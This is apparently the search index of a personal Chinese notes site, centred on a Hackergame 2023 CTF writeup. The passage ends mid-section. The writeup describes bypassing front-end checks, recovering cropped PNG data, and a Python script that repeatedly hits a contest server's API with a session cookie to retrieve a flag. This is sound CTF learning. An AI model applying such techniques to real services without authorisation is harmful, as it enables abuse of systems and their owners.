{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f \u00b6 \u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a17 \u603b\u5b57\u6570\uff1a3945 \u4ee3\u7801\u5757\u884c\u6570\uff1a222 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"#_1","text":"\u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a17 \u603b\u5b57\u6570\uff1a3945 \u4ee3\u7801\u5757\u884c\u6570\uff1a222 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"changelog/","text":"\u66f4\u65b0\u8bb0\u5f55 \u00b6 Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u6539\u52a8\u8bb0\u5f55 PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u7528\u7684\u662fTony\u4f6c\u7684\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; } 2023 \u00b6 2023-10-26 \u00b6 ZJUCTF 2023 Writeup 2023-10-25 \u00b6 \u4f7f\u7528TonyCrane Toolchain\u5b8c\u6210\u4e86\u521d\u6b65note\u7684\u90e8\u7f72","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#_1","text":"Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u6539\u52a8\u8bb0\u5f55 PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u7528\u7684\u662fTony\u4f6c\u7684\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; }","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#2023","text":"2023-10-26 \u00b6 ZJUCTF 2023 Writeup 2023-10-25 \u00b6 \u4f7f\u7528TonyCrane Toolchain\u5b8c\u6210\u4e86\u521d\u6b65note\u7684\u90e8\u7f72","title":"2023"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"todo/","text":"note\u8ba1\u5212 \u00b6 \u7ea6 28 \u4e2a\u5b57 \u5efa\u7ad9\u76f8\u5173 \u00b6 [] \u4f7f\u7528TonyCrane-toolchain\u642d\u5efa [] \u6839\u636e\u81ea\u5df1\u9700\u6c42\u505a\u51fa\u81ea\u5b9a\u4e49 \u7b14\u8bb0\u76f8\u5173 \u00b6 [] loading...","title":"ToDo"},{"location":"todo/#note","text":"\u7ea6 28 \u4e2a\u5b57","title":"note\u8ba1\u5212"},{"location":"todo/#_1","text":"[] \u4f7f\u7528TonyCrane-toolchain\u642d\u5efa [] \u6839\u636e\u81ea\u5df1\u9700\u6c42\u505a\u51fa\u81ea\u5b9a\u4e49","title":"\u5efa\u7ad9\u76f8\u5173"},{"location":"todo/#_2","text":"[] loading...","title":"\u7b14\u8bb0\u76f8\u5173"},{"location":"ai/","text":"Artificial Intelligence \u00b6 \u7ea6 2 \u4e2a\u5b57","title":"Artificial Intelligence"},{"location":"ai/#artificial-intelligence","text":"\u7ea6 2 \u4e2a\u5b57","title":"Artificial Intelligence"},{"location":"ai/pytorch/","text":"Pytorch \u00b6 \u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bPytorch\u6846\u67b6\u7684\u57fa\u7840","title":"PyTorch"},{"location":"ai/pytorch/#pytorch","text":"\u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bPytorch\u6846\u67b6\u7684\u57fa\u7840","title":"Pytorch"},{"location":"ai/tensorflow/","text":"Tensorflow \u00b6 \u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bTensorflow\u6846\u67b6\u7684\u57fa\u7840","title":"Tensorflow"},{"location":"ai/tensorflow/#tensorflow","text":"\u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bTensorflow\u6846\u67b6\u7684\u57fa\u7840","title":"Tensorflow"},{"location":"cs/","text":"","title":"Index"},{"location":"ctf/","text":"CTF \u00b6 Abstract CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002 Table of Contents \u00b6 misc Steganography \u9690\u5199\u672f 0 0 mins 0 Web todo 0 0 mins 1698334667 Others Writeups 3568 222 14 mins 1699269193 Tools 1 0 mins 1698334667 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"CTF"},{"location":"ctf/#ctf","text":"Abstract CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002","title":"CTF"},{"location":"ctf/#table-of-contents","text":"misc Steganography \u9690\u5199\u672f 0 0 mins 0 Web todo 0 0 mins 1698334667 Others Writeups 3568 222 14 mins 1699269193 Tools 1 0 mins 1698334667 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"ctf/misc/","text":"","title":"Index"},{"location":"ctf/tools/","text":"Tools \u00b6","title":"Tools"},{"location":"ctf/tools/#tools","text":"","title":"Tools"},{"location":"ctf/web/","text":"","title":"Index"},{"location":"ctf/writeups/","text":"Writeups \u00b6 Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup Table of Contents \u00b6 Learning Ethernaut 134 0 mins 1699268877 2023 \ud83d\udd12 ZJUCTF 2023 250 1 mins \u4e0d\u516c\u5f00 Hackergame 2023 3147 222 13 mins 1699161500 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Writeups"},{"location":"ctf/writeups/#writeups","text":"Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup","title":"Writeups"},{"location":"ctf/writeups/#table-of-contents","text":"Learning Ethernaut 134 0 mins 1699268877 2023 \ud83d\udd12 ZJUCTF 2023 250 1 mins \u4e0d\u516c\u5f00 Hackergame 2023 3147 222 13 mins 1699161500 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"ctf/writeups/ethernaut/","text":"Ethernaut \u00b6 \u7ea6 130 \u4e2a\u5b57 Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 \u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 Hello Ethernaut \u00b6 Fallback \u00b6","title":"Ethernaut"},{"location":"ctf/writeups/ethernaut/#ethernaut","text":"\u7ea6 130 \u4e2a\u5b57 Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 \u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09","title":"Ethernaut"},{"location":"ctf/writeups/ethernaut/#hello-ethernaut","text":"","title":"Hello Ethernaut"},{"location":"ctf/writeups/ethernaut/#fallback","text":"","title":"Fallback"},{"location":"ctf/writeups/hackergame2023/","text":"Hackergame 2023 \u00b6 \u7ea6 3143 \u4e2a\u5b57 222 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3 Hackergame \u542f\u52a8 \u00b6 \u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity \u732b\u54aa\u5c0f\u6d4b \u00b6 \u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053 \u66f4\u6df1\u66f4\u6697 \u00b6 \u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14 \u65c5\u884c\u7167\u7247 3.0 \u00b6 \u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002 \u8d5b\u535a\u4e95\u5b57\u68cb \u00b6 \u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002 \u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b \u00b6 \u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002 \u7ec4\u59d4\u4f1a\u6a21\u62df\u5668 \u00b6 \u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag ) \u866b \u00b6 